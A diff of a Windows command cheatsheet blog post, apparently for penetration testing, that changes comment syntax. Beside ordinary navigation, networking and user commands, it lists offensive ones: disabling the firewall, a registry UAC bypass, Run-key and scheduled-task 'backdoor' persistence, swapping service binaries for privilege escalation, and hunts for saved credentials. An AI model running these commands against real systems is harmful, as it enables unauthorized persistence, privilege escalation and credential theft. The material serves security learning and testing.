@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "windows-cheatsheet"
+title: "windows cheatsheet"
 description: "A comprehensive Windows reference — navigation, file management, networking, users, processes, and offensive usage."
 ---
 
@@ -55,19 +55,19 @@ description: "A comprehensive Windows reference — navigation, file management,
 ## Navigation & File System
 
 ```cmd
-:: CMD — basic navigation
-cd                         :: print working directory
-cd C:\Users                :: change directory
-cd ..                      :: go up one level
-cd /                       :: go to drive root
-dir                        :: list directory contents
-dir /a                     :: show hidden files
-dir /s /b *.txt            :: recursive search for .txt files
-cls                        :: clear screen
-type file.txt              :: print file contents
-more file.txt              :: paginated view
-tree                       :: display directory tree
-tree /f                    :: include files in tree
+# CMD — basic navigation
+cd                         # print working directory
+cd C:\Users                # change directory
+cd ..                      # go up one level
+cd /                       # go to drive root
+dir                        # list directory contents
+dir /a                     # show hidden files
+dir /s /b *.txt            # recursive search for .txt files
+cls                        # clear screen
+type file.txt              # print file contents
+more file.txt              # paginated view
+tree                       # display directory tree
+tree /f                    # include files in tree
 ```
 
 ```powershell
@@ -89,19 +89,19 @@ pwd, cd, ls, cat, cp, mv, rm, mkdir
 ## File Operations
 
 ```cmd
-:: CMD
-copy file.txt C:\Temp\                    :: copy file
-copy file.txt newname.txt                 :: copy and rename
-xcopy C:\dir C:\backup /e /i /h          :: copy directory recursively
-move file.txt C:\Temp\                    :: move file
-rename file.txt newname.txt              :: rename file
-del file.txt                             :: delete file
-del /f /q file.txt                       :: force delete quietly
-rmdir dir                                :: delete empty directory
-rmdir /s /q dir                          :: delete directory recursively
-mkdir newdir                             :: create directory
-echo text > file.txt                     :: write to file (overwrite)
-echo text >> file.txt                    :: append to file
+# CMD
+copy file.txt C:\Temp\                    # copy file
+copy file.txt newname.txt                 # copy and rename
+xcopy C:\dir C:\backup /e /i /h          # copy directory recursively
+move file.txt C:\Temp\                    # move file
+rename file.txt newname.txt              # rename file
+del file.txt                             # delete file
+del /f /q file.txt                       # force delete quietly
+rmdir dir                                # delete empty directory
+rmdir /s /q dir                          # delete directory recursively
+mkdir newdir                             # create directory
+echo text > file.txt                     # write to file (overwrite)
+echo text >> file.txt                    # append to file
 ```
 
 ```powershell
@@ -125,24 +125,25 @@ Select-String "password" file.txt        # grep equivalent
 ## File Permissions & ACLs
 
 ```cmd
-:: View permissions
-icacls file.txt                          :: show ACL
-icacls C:\dir /T                         :: recursive
+# CMD
+# View permissions
+icacls file.txt                          # show ACL
+icacls C:\dir /T                         # recursive
 
-:: Modify permissions
-icacls file.txt /grant username:F        :: grant full control
-icacls file.txt /grant username:R        :: grant read
-icacls file.txt /grant username:W        :: grant write
-icacls file.txt /deny username:W         :: deny write
-icacls file.txt /remove username         :: remove user ACE
-icacls file.txt /reset                   :: reset to inherited
+# Modify permissions
+icacls file.txt /grant username:F        # grant full control
+icacls file.txt /grant username:R        # grant read
+icacls file.txt /grant username:W        # grant write
+icacls file.txt /deny username:W         # deny write
+icacls file.txt /remove username         # remove user ACE
+icacls file.txt /reset                   # reset to inherited
 
-:: Permission flags
-:: F = Full Control
-:: M = Modify
-:: RX = Read & Execute
-:: R = Read
-:: W = Write
+# Permission flags
+# F = Full Control
+# M = Modify
+# RX = Read & Execute
+# R = Read
+# W = Write
 ```
 
 ```powershell
@@ -163,21 +164,22 @@ accesschk.exe -ucqv servicename /accepteula
 ## Users & Groups
 
 ```cmd
-:: Local user management
-net user                                 :: list all local users
-net user username                        :: info about specific user
-net user username password /add         :: create user
-net user username /delete               :: delete user
-net user username * /add                :: create user, prompt for password
-net localgroup                          :: list all local groups
-net localgroup administrators           :: list members of admins group
-net localgroup administrators username /add  :: add user to admins
+# CMD
+# Local user management
+net user                                 # list all local users
+net user username                        # info about specific user
+net user username password /add         # create user
+net user username /delete               # delete user
+net user username * /add                # create user, prompt for password
+net localgroup                          # list all local groups
+net localgroup administrators           # list members of admins group
+net localgroup administrators username /add  # add user to admins
 
-:: Domain user management
-net user /domain                        :: list domain users
-net user username /domain               :: domain user info
-net group /domain                       :: list domain groups
-net group "Domain Admins" /domain       :: list Domain Admins
+# Domain user management
+net user /domain                        # list domain users
+net user username /domain               # domain user info
+net group /domain                       # list domain groups
+net group "Domain Admins" /domain       # list Domain Admins
 ```
 
 ```powershell
@@ -202,13 +204,13 @@ whoami /all                             # everything
 ## Processes
 
 ```cmd
-:: CMD
-tasklist                                 :: list running processes
-tasklist /fi "imagename eq chrome.exe"  :: filter by name
-tasklist /svc                            :: show services per process
-taskkill /pid 1234                       :: kill by PID
-taskkill /im chrome.exe                  :: kill by name
-taskkill /f /im chrome.exe              :: force kill
+# CMD
+tasklist                                 # list running processes
+tasklist /fi "imagename eq chrome.exe"  # filter by name
+tasklist /svc                            # show services per process
+taskkill /pid 1234                       # kill by PID
+taskkill /im chrome.exe                  # kill by name
+taskkill /f /im chrome.exe              # force kill
 ```
 
 ```powershell
@@ -230,32 +232,33 @@ Get-WmiObject Win32_Process | Select-Object Name,ProcessId,CommandLine
 ## Networking
 
 ```cmd
-:: Interface info
-ipconfig                                 :: basic interface info
-ipconfig /all                            :: detailed — MAC, DNS, DHCP
-ipconfig /flushdns                       :: flush DNS cache
-ipconfig /displaydns                     :: show DNS cache
+# CMD
+# Interface info
+ipconfig                                 # basic interface info
+ipconfig /all                            # detailed — MAC, DNS, DHCP
+ipconfig /flushdns                       # flush DNS cache
+ipconfig /displaydns                     # show DNS cache
 
-:: Connectivity
-ping 8.8.8.8                             :: ping
-ping -n 4 8.8.8.8                        :: ping 4 times
-tracert 8.8.8.8                          :: traceroute
-nslookup target.com                      :: DNS lookup
-nslookup target.com 8.8.8.8             :: DNS lookup via specific server
+# Connectivity
+ping 8.8.8.8                             # ping
+ping -n 4 8.8.8.8                        # ping 4 times
+tracert 8.8.8.8                          # traceroute
+nslookup target.com                      # DNS lookup
+nslookup target.com 8.8.8.8             # DNS lookup via specific server
 
-:: Connections & ports
-netstat -ano                             :: all connections with PIDs
-netstat -ano | findstr :80               :: filter by port
-netstat -ano | findstr LISTENING         :: listening ports only
-arp -a                                   :: ARP cache
+# Connections & ports
+netstat -ano                             # all connections with PIDs
+netstat -ano | findstr :80               # filter by port
+netstat -ano | findstr LISTENING         # listening ports only
+arp -a                                   # ARP cache
 
-:: Firewall
-netsh advfirewall show allprofiles       :: firewall status
-netsh advfirewall firewall show rule name=all  :: list all rules
-netsh advfirewall set allprofiles state off    :: disable firewall (requires admin)
+# Firewall
+netsh advfirewall show allprofiles       # firewall status
+netsh advfirewall firewall show rule name=all  # list all rules
+netsh advfirewall set allprofiles state off    # disable firewall (requires admin)
 netsh advfirewall firewall add rule name="Allow 4444" protocol=TCP dir=in localport=4444 action=allow
 
-:: Port forwarding
+# Port forwarding
 netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=192.168.1.10
 netsh interface portproxy show all
 netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0
@@ -278,19 +281,19 @@ Test-Connection 8.8.8.8                  # ping equivalent
 ## Services
 
 ```cmd
-:: CMD
-sc query                                 :: list all services
-sc query servicename                     :: query specific service
-sc start servicename                     :: start service
-sc stop servicename                      :: stop service
-sc config servicename start= auto        :: set service to auto start
-sc config servicename binpath= "C:\evil.exe"  :: change service binary (privesc)
-sc create servicename binpath= "C:\evil.exe" start= auto  :: create service
-sc delete servicename                    :: delete service
+# CMD
+sc query                                 # list all services
+sc query servicename                     # query specific service
+sc start servicename                     # start service
+sc stop servicename                      # stop service
+sc config servicename start= auto        # set service to auto start
+sc config servicename binpath= "C:\evil.exe"  # change service binary (privesc)
+sc create servicename binpath= "C:\evil.exe" start= auto  # create service
+sc delete servicename                    # delete service
 
-net start                                :: list running services
-net start servicename                    :: start service
-net stop servicename                     :: stop service
+net start                                # list running services
+net start servicename                    # start service
+net stop servicename                     # stop service
 ```
 
 ```powershell
@@ -312,21 +315,21 @@ Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "C:\Windows*"} 
 ## Registry
 
 ```cmd
-:: CMD — reg command
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  :: startup entries
-reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  :: user startup
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  :: autologon creds
-reg query HKLM /f password /t REG_SZ /s  :: search for password values
+# CMD
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  # startup entries
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  # user startup
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon creds
+reg query HKLM /f password /t REG_SZ /s  # search for password values
 reg query HKCU /f password /t REG_SZ /s
 
-:: Add / modify
+# Add / modify
 reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd.exe" /f
 reg add "HKCU\...\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe" /f
 
-:: Delete
+# Delete
 reg delete "HKCU\...\Run" /v backdoor /f
 
-:: Export / import
+# Export / import
 reg export HKLM\SOFTWARE\target backup.reg
 reg import backup.reg
 ```
@@ -352,12 +355,12 @@ Remove-ItemProperty -Path "HKCU:\...\Run" -Name "backdoor"
 ## Scheduled Tasks
 
 ```cmd
-:: CMD
-schtasks /query /fo LIST /v              :: list all tasks verbosely
+# CMD
+schtasks /query /fo LIST /v              # list all tasks verbosely
 schtasks /query /fo LIST /v | findstr "Task Name\|Run As\|Task To Run"
-schtasks /create /tn "taskname" /tr "C:\evil.exe" /sc onlogon /ru System  :: create task
-schtasks /run /tn "taskname"             :: run task immediately
-schtasks /delete /tn "taskname" /f       :: delete task
+schtasks /create /tn "taskname" /tr "C:\evil.exe" /sc onlogon /ru System  # create task
+schtasks /run /tn "taskname"             # run task immediately
+schtasks /delete /tn "taskname" /f       # delete task
 ```
 
 ```powershell
@@ -436,19 +439,20 @@ Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\Temp\file.exe
 ### Situational Awareness
 
 ```cmd
-:: Quick overview
-whoami /all                              :: user, groups, privileges
-systeminfo                               :: OS, patches, architecture, domain
+# CMD
+# Quick overview
+whoami /all                              # user, groups, privileges
+systeminfo                               # OS, patches, architecture, domain
 hostname
-net user %username%                      :: current user details
-net localgroup administrators            :: who has admin?
+net user %username%                      # current user details
+net localgroup administrators            # who has admin?
 
-:: Domain context
-echo %userdomain%                        :: domain name
-echo %logonserver%                       :: domain controller
-net user /domain                         :: domain users
-net group "Domain Admins" /domain        :: domain admins
-nltest /dclist:domain.local              :: list domain controllers
+# Domain context
+echo %userdomain%                        # domain name
+echo %logonserver%                       # domain controller
+net user /domain                         # domain users
+net group "Domain Admins" /domain        # domain admins
+nltest /dclist:domain.local              # list domain controllers
 ```
 
 ```powershell
@@ -493,15 +497,15 @@ type C:\Windows\system32\sysprep\sysprep.xml
 # Registry credential hunting
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  :: autologon
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s                 :: PuTTY creds
-reg query "HKCU\Software\ORL\WinVNC3\Password"                          :: VNC creds
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s                 # PuTTY creds
+reg query "HKCU\Software\ORL\WinVNC3\Password"                          # VNC creds
 
 # PowerShell history
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 # Saved credentials
-cmdkey /list                             :: saved Windows credentials
+cmdkey /list                             # saved Windows credentials
 ```
 
 ### Privilege Escalation Enumeration
